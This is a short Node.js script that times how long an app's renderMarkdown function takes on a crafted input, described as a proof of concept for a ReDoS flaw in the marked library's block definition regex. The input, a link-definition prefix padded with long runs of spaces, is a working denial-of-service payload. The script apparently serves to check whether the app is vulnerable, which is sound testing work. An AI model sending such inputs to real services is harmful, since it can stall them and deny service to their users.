'use strict';
// Runs the marked ReDoS proof of concept (GHSA-rrrm-qjm4-v8hf, block "def" regex) against the app's own render function.
const { renderMarkdown } = require(process.argv[2] + '/src/app');
const n = 1500;
const t = Date.now();
renderMarkdown('[x]:' + ' '.repeat(n) + 'x' + ' '.repeat(n) + 'x');
process.stdout.write(String(Date.now() - t));
